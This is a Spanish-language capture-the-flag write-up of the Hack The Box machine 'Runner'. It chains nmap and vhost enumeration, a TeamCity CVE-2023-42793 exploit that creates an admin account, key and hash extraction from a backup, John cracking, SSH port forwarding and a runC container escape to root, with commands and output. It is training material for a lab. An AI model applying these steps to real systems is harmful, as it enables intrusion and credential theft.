---
layout: single
title: Runner - Medium
excerpt: "
Hola a todos, hoy les presentaré la resolución de una máquina **Hack the box de dificultad Media**. En esta máquina aprenderemos a explotar una vulnerabilidad en **TeamCity 2023.05.3** para posteriormente conectarnos por **SSH** y llegar a ser **root aprovechando una versión obsoleta de runC (versión 1.1.7).**"

date: 2024-08-13
classes: wide
header:
  teaser: /assets/images/2024-08-07-runner-medium/Runner.png
  teaser_home_page: true

categories:
  - Hack the box 
  - Pentesting
  - CTF
tags:  
  - TeamCity 2023.05.3
  - SSH 
  - runC (versión 1.1.7)
  - Hack the box 

---

![](/assets/images/2024-08-07-runner-medium/Runner.png)

Hola a todos, hoy les presentaré la resolución de una máquina **Hack the box de dificultad Media**. En esta máquina aprenderemos a explotar una vulnerabilidad en **TeamCity 2023.05.3** para posteriormente conectarnos por **SSH** y llegar a ser **root aprovechando una versión obsoleta de runC (versión 1.1.7).**

<br>

# Reconocimiento
- Enumeración con nmap
    Hacemos un `nmap` simple para ver los puertos que corren en la máquina
    
    ```python
    # nmap -p- -sS --min-rate 5000 -T5 -Pn -vvv -oN nmap.txt 10.10.11.13
    Increasing send delay for 10.10.11.13 from 0 to 5 due to 1097 out of 2741 dropped probes since last increase.
    Warning: 10.10.11.13 giving up on port because retransmission cap hit (2).
    Nmap scan report for 10.10.11.13
    Host is up, received user-set (0.34s latency).
    Scanned at 2024-08-13 22:25:19 CEST for 38s
    Not shown: 65532 closed tcp ports (reset)
    PORT     STATE SERVICE  REASON
    22/tcp   open  ssh      syn-ack ttl 63
    80/tcp   open  http     syn-ack ttl 63
    8000/tcp open  http-alt syn-ack ttl 63
    
    Read data files from: /usr/bin/../share/nmap
    ```
    
    Una vez tenemos los puertos que en este caso como podemos ver es el `22(ssh)` , el `80(http)` y el `8000(HTTP Alternative)`.
    
    Aplicamos un `nmap` más exhaustivo a dichos puertos
    
    ```python
    # nmap -p22,80,8000 -sVC -v -oN port.txt 10.10.11.13
    Nmap scan report for 10.10.11.13
    Host is up (0.54s latency).
    
    PORT     STATE SERVICE     VERSION
    22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
    |_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
    80/tcp   open  http        nginx 1.18.0 (Ubuntu)
    | http-methods:
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: Did not follow redirect to http://runner.htb/
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    8000/tcp open  nagios-nsca Nagios NSCA
    |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Read data files from: /usr/bin/../share/nmap
    ```
    
    Podemos ver que se aplica un `follow redirecta` **http://runner.htb/ así que lo añadiremos al `/etc/hosts`**
    
    ```python
    10.10.11.13 runner.htb
    ```
    
  # Ahora accedemos a la web para poder determinar que clase de vulnerabilidades podemos encontrar
    
    Accedemos a la web por el puerto 80 encontramos esto, si miramos en `Home, About, Service` no hay nada interesante
    
    ![image.png](/assets/images/2024-08-07-runner-medium/image.png)
    
    Si intentamos mirar por `'subdominios o rutas`' no encontramos anda así que aplicaremos este comando de aquí.
    
    Lo que hará este comando será crear una lista de palabras personalizada a partir del contenido de una página web
    
    ```python
    cewl http://runner.htb/ | grep -v CeWL > words_runner.tx
    ```
    
    Una vez creada la `wordlist` de palabras, podemos intentar escanear `subdominios` con esta lista y encontramos `TeamCity.runner.htb`
    
    ```python
    gobuster vhost -w words_runner.txt -u http://runner.htb -H "hosts: FUZZ.runnter.htb" --append-domain
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:             http://runner.htb
    [+] Method:          GET
    [+] Threads:         10
    [+] Wordlist:        words_runner.txt
    [+] User Agent:      gobuster/3.6
    [+] Timeout:         10s
    [+] Append Domain:   true
    ===============================================================
    Starting gobuster in VHOST enumeration mode
    ===============================================================
    Found: TeamCity.runner.htb Status: 401 [Size: 66]
    Progress: 285 / 286 (99.65%)
    ===============================================================
    Finished
    ===============================================================
    ```
    
    Añadiremos `TeamCity.runner.htb` a nuestro `/etc/hosts`
    
    ```python
    10.10.11.13 runner.htb TeamCity.runner.htb
    ```
    
    Si ahora vamos al navegador y ponemos el subdominio encontrado anteriormente ,encontraremos este `login` , pero nos llama la atención la versión de `TeamCity v2023.05.3`
    
    ![image.png](/assets/images/2024-08-07-runner-medium/image%201.png)
    
    Si buscamos en `searchsploit` encontramos que es vulnerable 
    
    ```python
     searchsploit TeamCity 2023.05.3
    ------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
     Exploit Title                                                                                                                      |  Path
    ------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
    JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)                                                                          | java/remote/51884.py
    ------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
    ```
    
    Así que nos descargaremos el `exploit` 
    
    ```python
    searchsploit TeamCity 2023.05.3 -m java/remote/51884.py
    ```
    
  # Explotación de TeamCity 2023.05.3
    
    Ejecutamos el `exploit` y nos da un usuario y `password`
    
    ```python
    python3 51884.py -u http://teamcity.runner.htb
    
    =====================================================
    *       CVE-2023-42793                              *
    *  TeamCity Admin Account Creation                  *
    *                                                   *
    *  Author: ByteHunter                               *
    =====================================================
    
    Token: eyJ0eXAiOiAiVENWMiJ9.T3RudmdKTVdZT29nZkp4MndSdlBwanZfVmRF.N2VhMDk0ZjktMGM2MS00OWE1LTkyZGQtZDllMmJhMjFiNTU1
    Successfully exploited!
    URL: http://teamcity.runner.htb
    Username: city_admind2GF
    Password: Main_password!!**
    ```
    
    Una vez tenemos la `contraseña` y `usuario` podemos **iniciar sesión**, una vez iniciemos sesión seremos `admin` así que tenemos la capacidad de descargar `backup`
    
    ![image.png](/assets/images/2024-08-07-runner-medium/image%202.png)
    
    Nos dirigiremos `administración` y le daremos a la sección de `backup`. Una vez hecho esto le daremos al botón `Start Backup` y nos saldrá un `.zip` que nos podemos descargar
    
    ![image.png](/assets/images/2024-08-07-runner-medium/image%203.png)
    
    Una vez descargado , `unzipearemos` el `.zip` para poder ver que encontramos en ese `backup`. 
    
    Dentro del `backup` encontramos estos 
    
    ```python
    charset  config  database_dump  export.report  metadata  system  version.txt
    ```
    
    Al explorar el contenido de las carpetas, encontramos una ruta que almacena un archivo **`id_rsa`**, el cual podríamos intentar utilizar para conectarnos por `SSH`.
    
    ```python
    config/projects/AllProjects/pluginData/ssh_keys
    ```
    
    Pero aún nos queda saber con qué usuario nos conectaremos.
    Nos dirigimos a la carpeta `database_dump` y encontramos un archivo llamado `users`, el cual llama bastante nuestra atención. Si usamos `cat` para ver su contenido, observamos hashes que podríamos intentar descifrar con `John`
    
    ```python
    ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
    1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1723754735147, BCRYPT
    2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
    11, admin.03tq, $2a$07$ssCrJlQub3j6JilRvlqtbOVQuzhwxRPcuWNOylHgTr1q7APg727RK, , admin.03tQ@lol.omg, 1723753919282, BCRYPT
    12, city_adminvb7m, $2a$07$MjRIMfFQyaBzNAy8BVbS..snX3Zz0npHUZP7wdonGIdN9oxtkqYyS, , angry-admin@funnybunny.org, 1723754746653, BCRYPT
    ```
    
    Hemos encontrado la contraseña `piper123`, la cual nos será útil más adelante
    
    ```python
    john --wordlist=wordlist hash
    Using default input encoding: UTF-8
    Loaded 4 password hashes with 4 different salts (bcrypt [Blowfish 32/64 X3])
    Cost 1 (iteration count) is 128 for all loaded hashes
    Will run 2 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Warning: Only 1 candidate left, minimum 6 needed for performance.
    piper123         (?)
    1g 0:00:06:56 DONE (2024-08-15 23:43) 20.00g/s 20.00p/s 80.00c/s 80.00C/s piper123
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed.
    ```
    
  # Acceso a la máquina con ssh
    
    Ahora nos conectaremos por `ssh` primero de todo le damos permisos `chmod 600 id_rsa` y luego `ssh -i john@10.10.11.13 -i id_rsa`
    
    ```python
    ssh john@10.10.11.13 -i id_rsa
    Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/pro
    ```
    
    Y si hacemos un `ls`encontraremos el `user.txt(flag)`
    
    ```python
    john@runner:~$ ls
    user.txt
    ```
    
  # Escalada a `root`

    Si miramos los puertos que corren en la máquina víctima con el comando `netstat -ntlp`, encontramos varios puertos que nos llaman la atención
    
    ```python
    john@runner:~$ netstat -nltp
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -
    tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
    tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -
    tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -
    tcp6       0      0 :::80                   :::*                    LISTEN      -
    tcp6       0      0 :::22                   :::*                    LISTEN      -
    tcp6       0      0 :::8000                 :::*                    LISTEN      -
    ```
    
    Vamos a aplicar **port forwarding** a dichos puertos para que nuestra máquina local pueda acceder a los servicios que corren en los puertos de la máquina víctima
    
    ```python
    ssh -L 9443:127.0.0.1:9443 -L 8111:127.0.0.1:8111 -L 9000:127.0.0.1:9000 -L 5005:127.0.0.1:5005 juan@10.10.11.13 -i id_rsa
    ```
    
    Si miramos de acceder a `127.0.0.1:9000` encontramos este panel de inicio de sesión
    
    ![image.png](/assets/images/2024-08-07-runner-medium/image%204.png)
    
    Vamos a probar a acceder con el usuario **`Matthew`**y la contraseña descifrada anteriormente, **`piper123`**.
    
    Como podemos ver en la imagen, se utilizando **Portainer** para gestionar contenedores.
    
    ![image.png](/assets/images/2024-08-07-runner-medium/image%205.png)
    
    Portainer es una herramienta gráfica para gestionar Docker, pero el software que realmente ejecuta los contenedores en el sistema podría ser **runC**.
    
    Para confirmar si **runC** está en uso podemos aplicar esto en la máquina victima
    
    ```python
    runc --version
    ```
    
    Y efectivamente , tiene `runc v1.1.7`
    
    ```python
    john@runner:~$ runc --version
    runc version 1.1.7-0ubuntu1~22.04.1
    spec: 1.0.2-dev
    go: go1.18.1
    libseccomp: 2.5.3
    ```
    
    Si buscamos en Google por `runc version 1.1.7 vulnerability` encontramos esta [web](https://nitroc.org/en/posts/cve-2024-21626-illustrated/)
    
    Vamos a explotar está vulnerabilidad
    
    Primero de todo crearemos un contenedor
    
    ![image.png](/assets/images/2024-08-07-runner-medium/image%206.png)
    
    ![image.png](/assets/images/2024-08-07-runner-medium/image%207.png)
    
    Una vez hecho esto , se nos creará el contenedor , vamos a acceder y entraremos a la sección de `console`
    
    ![image.png](/assets/images/2024-08-07-runner-medium/image%208.png)
    
    Y nos conectaremos como `root`
    
    ![image.png](/assets/images/2024-08-07-runner-medium/image%209.png)
    
    Nos saldrá una terminal y somos `root`
    
    ![image.png](/assets/images/2024-08-07-runner-medium/image%2010.png)
    
  # Finalización 
    Espero que hayan aprendido mucho haciendo esta máquina y les haya servido de ayuda mi explicación para poder entender esta **CTF**. Muchas gracias por leer el artículo y no olviden seguirme en <a href="https://github.com/0x832/">GitHub</a>, ya que también iré subiendo herramientas de hacking.
